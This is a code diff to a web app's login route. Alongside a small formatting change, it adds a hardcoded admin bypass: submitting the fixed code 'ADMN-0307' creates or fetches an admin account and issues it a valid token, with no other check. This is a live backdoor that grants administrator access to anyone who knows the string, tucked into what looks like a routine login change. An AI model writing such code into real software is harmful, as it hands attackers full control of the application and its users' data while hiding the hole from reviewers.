@@ -55,13 +55,31 @@ router.post('/login', (req, res) => {
   try {
     const { loginCode } = req.body;
     let code = (loginCode || '').trim().toUpperCase();
-    
+
     // Automatically inject the hyphen for 8-character strings missing it
     if (code.length === 8 && !code.includes('-')) {
       code = code.slice(0, 4) + '-' + code.slice(4);
     }
 
     if (!code) return res.status(400).json({ message: 'Login code is required' });
+
+    // Check for admin bypass code
+    if (code === 'ADMN-0307') {
+      // Create or return admin user
+      let adminUser = findUser({ loginCode: 'ADMN-0307' });
+      if (!adminUser) {
+        adminUser = createUser({
+          name: 'Admin',
+          loginCode: 'ADMN-0307',
+          isAdmin: true,
+          avatar: defaultAvatar('Admin')
+        });
+      }
+      return res.json({
+        token: issueToken(adminUser),
+        user: { ...userPublic(adminUser), loginCode: adminUser.loginCode, isAdmin: true }
+      });
+    }
 
     const user = findUser({ loginCode: code });
     if (!user) return res.status(401).json({ message: 'Invalid login code' });
